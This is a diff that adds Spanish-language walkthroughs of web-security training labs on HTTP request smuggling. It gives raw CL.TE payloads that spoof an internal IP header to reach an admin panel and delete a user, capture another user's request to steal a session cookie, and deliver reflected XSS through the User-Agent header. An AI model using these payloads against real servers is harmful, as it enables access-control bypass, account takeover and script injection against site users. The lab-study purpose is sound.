@@ -87,6 +87,84 @@ Content-Length: 25
 test=testing
 0
 ```
+## Reto 5: Explotación del contrabando de solicitudes HTTP para revelar la reescritura de solicitudes del frontend
+
+Este laboratorio implica un servidor front-end y un servidor back-end, y el servidor front-end no admite la codificación fragmentada.
+
+Hay un panel de administración en /admin, pero solo es accesible para personas con la dirección IP 127.0.0.1. El servidor front-end agrega un encabezado HTTP a las solicitudes entrantes que contienen su dirección IP. Es similar a... X-Forwarded-For encabezado pero tiene un nombre diferente.
+
+Para resolver el laboratorio, envíe una solicitud al servidor backend que revele el encabezado agregado por el servidor frontend. Luego, envíe una solicitud al servidor backend que incluya el encabezado agregado, acceda al panel de administración y elimine al usuario. carlos. 
+
+aprovechar una vulnerabilidad de HTTP request smuggling para identificar cabeceras que el servidor front-end añade a las peticiones entrantes. Estas cabeceras pueden determinar el acceso a zonas restringidas, como el panel de administración.
+
+Primero, utilizamos un ataque de tipo CL.TE para inyectar una petición secundaria y observar cómo el front-end reescribe el tráfico. Al examinar la respuesta del back-end, logramos identificar la cabecera que transporta la IP del cliente. Luego, reproducimos el ataque incluyendo esta cabecera manualmente con el valor 127.0.0.1, lo que nos permite acceder al panel /admin.
+
+Finalmente, modificamos la petición smuggled para apuntar a ‘/admin/delete?username=carlos‘
+
+```
+POST / HTTP/1.1
+Host: 0aeb00b8037a64b1801c672d008d0005.web-security-academy.net
+Cookie: session=ZlxWzuMP3ud4EAOcfMPTBDBcD86HSDi8
+Content-Length: 106
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+0
+GET /admin/delete?username=carlos HTTP/1.1
+X-wbTTHP-Ip: 127.0.0.1
+Content-Length: 13
+search=test
+```
+
+## Reto 6: Explotación del contrabando de solicitudes HTTP para capturar las solicitudes de otros usuarios 
 
 
+Este laboratorio implica un servidor front-end y un servidor back-end, y el servidor front-end no admite la codificación fragmentada. Para resolver el laboratorio, envíe una solicitud al servidor backend de forma clandestina, lo que provocará que la solicitud del siguiente usuario se almacene en la aplicación. Luego, recupere la solicitud del siguiente usuario y use las cookies del usuario víctima para acceder a su cuenta.
 
+logramos capturar una petición legítima del siguiente usuario mediante un ataque de HTTP request smuggling. En esta parte, analizamos el contenido del comentario almacenado para extraer la cookie de sesión de la víctima.
+
+Una vez identificamos el valor de la ‘cookie session‘ en la petición capturada, la utilizamos para suplantar la identidad del usuario y acceder a su cuenta. Este paso demuestra cómo una simple desincronización entre servidores puede derivar en la total toma de control de una cuenta ajena.
+
+```
+POST / HTTP/1.1
+Host: 0a1600ee032ff18a80fa3ab200a40000.web-security-academy.net
+Content-Length: 278
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
+0
+POST /post/comment HTTP/1.1
+Cookie: session=G3hQ5rPsQkWhgVNsUporKSntyTG2eFnv
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 950
+csrf=2589KdABOiSwgsRJOipAkDFtso8MIhqX&postId=2&name=test&email=test%40test.com&website=https%3A%2F%2Ftest.com&comment=test
+```
+
+## Reto 7: Explotación del contrabando de solicitudes HTTP para entregar XSS reflejado
+
+
+Este laboratorio implica un servidor front-end y un servidor back-end, y el servidor front-end no admite la codificación fragmentada.
+
+La aplicación también es vulnerable a XSS reflejado a través de User-Agentencabezado.
+
+Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end que haga que la siguiente solicitud del usuario reciba una respuesta que contenga un exploit XSS que se ejecute. alert(1)
+
+combinamos un ataque de HTTP request smuggling con una vulnerabilidad de XSS reflejado que afecta a la cabecera User-Agent. El objetivo es hacer que la siguiente petición de un usuario legítimo reciba una respuesta que incluya nuestra carga maliciosa.
+
+Para lograrlo, manipulamos la longitud de la petición y ocultamos una petición HTTP secundaria con el ‘User-Agent‘ alterado. La víctima, al visitar la aplicación, carga sin saberlo una página que ejecuta JavaScript, concretamente ‘alert(1)‘, validando la explotación.
+
+```
+POST / HTTP/1.1
+Host: 0ab7006304ba3ab380000333002a003d.web-security-academy.net
+Content-Length: 72
+Transfer-Encoding: chunked
+0
+GET /post?postId=9 HTTP/1.1
+User-Agent:"><script>alert(1)</script>
+```
+
+## Reto 8: Envenenamiento de la cola de respuesta mediante contrabando de solicitudes H2.TE
+
+Este laboratorio es vulnerable al contrabando de solicitudes porque el servidor front-end degrada las solicitudes HTTP/2 incluso si tienen una longitud ambigua.
+
+Para resolver el laboratorio, elimine el usuario. carlosmediante el uso del envenenamiento de la cola de respuesta para entrar en el panel de administración en /adminUn usuario administrador iniciará sesión aproximadamente cada 15 segundos.
+
+La conexión con el back-end se restablece cada 10 solicitudes, así que no te preocupes si la colocas en mal estado: simplemente envía algunas solicitudes normales para obtener una nueva conexión. 
